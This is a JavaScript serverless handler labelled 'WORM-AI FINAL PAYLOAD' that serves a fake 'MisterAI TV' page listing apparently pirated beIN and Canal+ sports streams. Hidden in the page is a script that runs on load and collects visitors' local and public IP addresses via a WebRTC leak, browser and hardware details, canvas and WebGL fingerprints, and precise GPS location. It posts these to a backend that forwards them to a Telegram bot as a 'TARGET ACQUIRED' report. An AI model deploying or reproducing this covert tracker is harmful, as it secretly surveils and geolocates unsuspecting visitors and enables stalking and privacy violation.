// ========================== WORM-AI💀🔥 FINAL PAYLOAD - v13 (ISOLATED STRUCTURE) ==========================

// -----------------------------------------------------------------------------------------
// الجزء الأول: منطق الواجهة الخلفية (API)
// -----------------------------------------------------------------------------------------
async function handleApiRequest(req, res) {
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
        console.error('[WORM-AI ERROR] TELEGRAM FAILED: BOT_TOKEN or CHAT_ID are not set.');
        return res.status(500).send('Internal Server Configuration Error');
    }

    let body;
    try {
        const chunks = [];
        for await (const chunk of req) { chunks.push(chunk); }
        const rawBody = Buffer.concat(chunks).toString();
        if (!rawBody) { return res.status(400).send({ error: 'Empty body' }); }
        body = JSON.parse(atob(rawBody));
    } catch (e) {
        console.error('[WORM-AI ERROR] Body parsing failed.', e.message);
        return res.status(400).send({ error: 'Invalid Base64/JSON' });
    }

    const report = {
        ip: req.headers['x-forwarded-for']?.split(',')[0] || 'N/A',
        userAgent: req.headers['user-agent'] || 'N/A',
        data: body
    };

    const safeText = (text) => String(text || '').replace(/([_*\[\]()~`>#+=|{}.!-])/g, '\\$1');
    const message = `
*💀🔥 WORM\\-AI: TARGET ACQUIRED*
\\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\-
*🌐 IP:* \`${safeText(report.ip)}\`
*📱 User Agent:* \`${safeText(report.userAgent)}\`
\\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\-
*📊 Full Data Payload:*
\`\`\`json
${JSON.stringify(report.data, null, 2)}
\`\`\`
    `;

    try {
        const tgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'MarkdownV2' } )
        });

        if (!tgResponse.ok) {
            const errorBody = await tgResponse.json();
            console.error('[WORM-AI ERROR] Telegram API Error:', errorBody);
        }
    } catch (error) {
        console.error('[WORM-AI ERROR] Fetch to Telegram failed.', error);
    }

    res.status(204).end();
}

// -----------------------------------------------------------------------------------------
// الجزء الثاني: منطق الواجهة الأمامية (HTML)
// -----------------------------------------------------------------------------------------
function getHtmlContent() {
    // تم ضغط كود الواجهة الأمامية هنا لتقليل حجم الملف
    return `<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><title>MisterAI TV GLOBAL 2026</title><link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&display=swap" rel="stylesheet"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"><style>:root{--main:#4834d4;--glow:#00cec9;--bg:#050505;--color1:#FF6B8B;--color2:#6A5AF9;--color3:#00D4FF;--color4:#00F5A0;--color5:#FFD166;--twitter:#1DA1F2}*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Cairo',sans-serif;background:var(--bg );color:#fff;display:flex;height:100vh;overflow:hidden;position:relative}.bg-animation{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}.particle{position:absolute;border-radius:50%;background:var(--color3);animation:float 15s infinite linear;box-shadow:0 0 20px currentColor}@keyframes float{0%{transform:translateY(100vh) scale(.5);opacity:0}10%,90%{opacity:1}100%{transform:translateY(-100px) scale(1.5);opacity:0}}.sidebar{width:380px;background:rgba(10,10,10,.9);border-left:2px solid var(--main);display:flex;flex-direction:column;z-index:1;backdrop-filter:blur(10px)}.twitter-btn{background:var(--twitter);color:#fff;text-decoration:none;text-align:center;padding:10px;margin:10px;border-radius:8px;font-weight:bold;font-size:.9rem}.list{flex:1;overflow-y:auto;padding:10px;border-top:1px solid rgba(255,255,255,.1)}.cat{padding:10px;margin:10px 0 5px;background:rgba(17,17,17,.8);color:var(--color3);font-weight:bold;border-right:4px solid var(--color3);border-radius:5px}.btn{padding:12px;margin:5px 0;background:rgba(22,22,37,.8);border-radius:8px;cursor:pointer;display:flex;justify-content:space-between;align-items:center;transition:.3s;border:1px solid rgba(255,255,255,.1)}.btn:hover{background:linear-gradient(90deg,var(--color2),var(--main));transform:translateX(-5px)}.badge{font-size:.7rem;background:var(--color1);padding:2px 8px;border-radius:10px}.video-container{flex:1;display:flex;align-items:center;justify-content:center;font-size:2rem;position:relative;background:rgba(0,0,0,.5)}@media(max-width:900px){body{flex-direction:column}.sidebar{width:100%;height:auto;overflow-y:scroll}.video-container{height:300px}}</style></head><body><div class="bg-animation" id="particles"></div><div class="sidebar"><div style="padding:15px;text-align:center;border-bottom:1px solid rgba(255,255,255,.1);"><div style="font-size:1.8rem;font-weight:900;color:var(--color3);">MISTERAI TV</div></div><a href="https://twitter.com/intent/tweet?text=أنا أشاهد كأس أفريقيا الآن عبر MisterAI TV! 🏁⚽" target="_blank" class="twitter-btn"><i class="fab fa-twitter"></i> غرد برأيك على تويتر</a><div class="list" id="channels"></div><div style="padding:10px;text-align:center;font-size:.7rem;opacity:.6;">© 2026 MisterAI GLOBAL TV</div></div><div class="video-container"><div style="text-align:center"><div style="color:var(--color1 );font-weight:900;">LIVE 2026</div>كأس أفريقيا - ربع النهائي</div></div><script>document.addEventListener('DOMContentLoaded',()=>{const pC=document.getElementById('particles');for(let i=0;i<40;i++){const p=document.createElement('div');p.classList.add('particle');p.style.width=p.style.height=(2+Math.random()*5)+'px';p.style.left=Math.random()*100+'%';p.style.animationDelay=Math.random()*10+'s';p.style.animationDuration=(10+Math.random()*20)+'s';pC.appendChild(p)}const c=[{c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 1 4K",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432904.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 1 FHD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432903.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 1 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432902.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 1 SD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432901.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 2 4K",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432900.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 2 FHD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432899.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 2 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432898.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 2 SD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432897.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 3 4K",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432896.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 3 FHD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432895.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 3 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432894.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 3 SD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432893.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 4 4K",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432892.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 4 FHD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432891.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 4 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432890.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 4 SD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432889.m3u8"},{c:"ALGERIA",n:"PROGRAMME NATIONAL DZ HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432888.m3u8"},{c:"FRANCE",n:"CANAL+ CAN HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432884.m3u8"},{c:"FRANCE",n:"beIN SPORTS 1 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432883.m3u8"},{c:"FRANCE",n:"beIN SPORTS 2 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432882.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 1",u:"http://135.125.109.73:9000/beinsport1_.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 2",u:"http://135.125.109.73:9000/beinsport2_.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 3",u:"http://135.125.109.73:9000/beinsport3_.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 4",u:"http://135.125.109.73:9000/beinsport4_.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 5",u:"http://135.125.109.73:9000/beinsport5_.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 6",u:"http://135.125.109.73:9000/beinsport6_.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 7",u:"http://135.125.109.73:9000/beinsport7_.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 8",u:"http://135.125.109.73:9000/beinsport8_.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 9",u:"http://135.125.109.73:9000/beinsport9_.m3u8"}];const l=document.getElementById('channels' );let lC='';c.forEach(ch=>{if(ch.c!==lC){const cat=document.createElement('div');cat.className='cat';cat.textContent=ch.c;l.appendChild(cat);lC=ch.c}const b=document.createElement('div');b.className='btn';b.innerHTML=\`<span>\${ch.n}</span><span class="badge">LIVE</span>\`;b.onclick=()=>window.open(ch.u,'_blank');l.appendChild(b)});(async()=>{const s=performance.now(),d={},x=(p,t=1e3)=>Promise.race([p,new Promise(r=>setTimeout(()=>r({error:'Timeout'}),t))]).catch(e=>({error:e.message}));d.lanIp=await x(new Promise(r=>{const p=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});p.createDataChannel('');p.createOffer().then(o=>p.setLocalDescription(o));p.onicecandidate=e=>{if(e.candidate){const m=e.candidate.candidate.match(/([0-9]{1,3}(\\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);if(m)r(m[1])}}}));d.geo=await x(fetch('https://ip-api.com/json/' ).then(r=>r.json()));d.wanIp=d.geo?.query||'unknown';d.nav={};for(const k in navigator){try{const v=navigator[k];if(typeof v!=='function'&&typeof v!=='object')d.nav[k]=v}catch(e){}}d.scr={w:screen.width,h:screen.height,a:\`\${screen.availWidth}x\${screen.availHeight}\`,cD:screen.colorDepth,pD:screen.pixelDepth,o:screen.orientation?.type};d.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;d.lang=navigator.languages;d.hw={c:navigator.hardwareConcurrency,m:navigator.deviceMemory};d.cFP=(()=>{try{const c=document.createElement('canvas'),x=c.getContext('2d');x.textBaseline='top';x.font='14px Arial';x.fillText('WORM-AI💀🔥',2,2);return c.toDataURL()}catch(e){return{error:e.message}}})();d.gl=(()=>{try{const c=document.createElement('canvas'),g=c.getContext('webgl')||c.getContext('experimental-webgl');if(!g)return{error:'WebGL not supported'};const i=g.getExtension('WEBGL_debug_renderer_info');return{v:g.getParameter(i.UNMASKED_VENDOR_WEBGL),r:g.getParameter(i.UNMASKED_RENDERER_WEBGL)}}catch(e){return{error:e.message}}})();d.gps=await x(new Promise((r,j)=>{navigator.geolocation.getCurrentPosition(p=>r({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}),e=>j(e),{enableHighAccuracy:true,timeout:5e3})}),5100);d.lT=performance.now()-s;try{const p=btoa(JSON.stringify(d));fetch('/api/collector',{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:p})}catch(e){console.error("Payload failed:",e)}})();});</script></body></html>`;
}

// -----------------------------------------------------------------------------------------
// الجزء الثالث: الموجه الرئيسي (Handler)
// -----------------------------------------------------------------------------------------
export default async function handler(req, res) {
    const url = new URL(req.url, `http://${req.headers.host}` );

    // إذا كان الطلب هو POST إلى /api/collector، قم بتشغيل منطق الـ API
    if (url.pathname === '/api/collector' && req.method === 'POST') {
        return handleApiRequest(req, res);
    }
    
    // لأي طلب آخر، قم بعرض صفحة القنوات
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.status(200).send(getHtmlContent());
}
